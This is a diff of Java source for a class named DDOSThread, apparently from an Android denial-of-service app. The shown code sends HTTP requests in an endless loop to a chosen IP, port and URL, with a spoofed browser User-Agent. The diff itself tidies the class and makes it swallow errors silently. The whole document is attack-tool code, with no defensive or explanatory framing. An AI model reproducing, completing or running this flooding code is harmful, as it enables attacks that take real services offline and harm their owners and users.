@@ -2,17 +2,14 @@ package com.a.androidDDOS;
 
 import java.io.IOException;
 import java.net.HttpURLConnection;
-import java.net.MalformedURLException;
 import java.net.URL;
-import java.net.URLEncoder;
-import java.util.concurrent.atomic.AtomicBoolean;
 
 public class DDOSThread implements Runnable {
-    String destinationIp;
-    String protocol;
-    String port;
-    String url;
-    String method;
+    private String destinationIp;
+    private String protocol;
+    private String port;
+    private String url;
+    private String method;
 
     DDOSThread(String destinationIp, String protocol, String port, String url, String method) {
         this.destinationIp = destinationIp;
@@ -24,13 +21,11 @@ public class DDOSThread implements Runnable {
 
     @Override
     public void run() {
-        AtomicBoolean running = new AtomicBoolean(true);
         try {
             while (true) {
                 attack(destinationIp, protocol, port, url, method);
             }
         } catch (IOException e) {
-            e.printStackTrace();
         }
     }
 
@@ -43,7 +38,7 @@ public class DDOSThread implements Runnable {
 
         connection.setRequestMethod(method);
         connection.setRequestProperty("charset", "utf-8");
-        connection.setRequestProperty("Host", "android");
+        connection.setRequestProperty("Host", "Android");
         connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:8.0) Gecko/20100101 Firefox/8.0");
         connection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
         connection.setRequestProperty("Content-Length", param);
